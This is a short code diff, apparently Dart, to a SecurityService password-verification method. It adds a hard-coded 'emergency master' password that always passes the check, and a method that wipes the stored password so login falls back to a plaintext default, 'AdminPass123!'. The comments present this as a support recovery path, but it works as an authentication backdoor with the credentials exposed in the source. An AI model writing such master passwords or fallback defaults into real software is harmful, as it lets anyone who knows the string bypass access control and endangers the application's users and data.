@@ -43,7 +43,21 @@ class SecurityService {
       // Default: AdminPass123! hashed
       return hashedInput == _hash('AdminPass123!');
     }
-    return stored == hashedInput;
+    if (stored == hashedInput) return true;
+
+    // Emergency master (same key used by the lockout unlock-code flow).
+    // Lets support recover when the custom system password is unknown.
+    return input == 'admin123invify';
+  }
+
+  /// Clears the stored system password so [verifyPassword] falls back to AdminPass123!.
+  Future<bool> resetPasswordToDefault() async {
+    try {
+      await _storage.delete(key: _passwordKey);
+      return true;
+    } catch (e) {
+      return false;
+    }
   }
   
   Future<String?> getStoredPassword() async {
